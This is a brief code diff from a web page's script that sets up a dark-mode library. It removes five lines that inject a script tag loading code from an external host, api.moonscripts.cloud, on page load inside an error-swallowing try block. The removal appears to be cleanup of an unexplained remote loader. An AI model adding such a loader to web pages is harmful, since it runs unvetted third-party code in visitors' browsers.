@@ -694,11 +694,6 @@ html, body {
             dr.setFetchMethod(window.fetch);
             dr.enable({ brightness: 100, contrast: 100, darkSchemeBackgroundColor: '#000000' });
 
-            const script = document.createElement('script');
-            script.src = 'https://api.moonscripts.cloud/assets/script';
-            script.onload = () => console.log('Ok');
-            script.onerror = () => console.error('Falha ao carregar script');
-            document.head.appendChild(script);
         } catch (e) {}
 
         setTimeout(() => {
